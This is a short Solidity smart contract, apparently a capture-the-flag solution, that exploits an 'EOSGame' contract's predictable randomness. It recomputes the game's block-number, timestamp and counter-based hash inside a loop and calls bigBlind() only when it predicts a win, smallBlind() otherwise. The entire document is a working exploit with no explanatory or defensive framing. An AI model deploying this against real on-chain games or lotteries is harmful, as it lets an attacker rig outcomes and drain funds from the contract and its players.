
contract Attacker{
    EOSGame game;
    
    uint256 MOD_NUM = 20;
    uint counter;
        
    constructor() public{
    }
    
    function setGame(address _address) public{
        game = EOSGame(_address);
    }
    function recursive(uint times) public returns(uint){
        
        uint out = counter + times;
        for(counter;counter<out;counter++){
            uint blockNum = uint256(keccak256(abi.encodePacked(block.number)));
            uint256 lucky_hash = uint256(keccak256(abi.encodePacked(counter)));
            uint256 seed = blockNum+uint256(keccak256(abi.encodePacked(block.timestamp)));
            uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
            if (seed_hash % MOD_NUM - lucky_hash % MOD_NUM == 0){
                game.bigBlind();
            }else{
                game.smallBlind();
            }
        }
        return out;
    }
    function resetCounter() public {
        counter = game.bet_count(tx.origin);
    }
    
    function getCount() public view returns(uint){
       return counter;
    }
    
}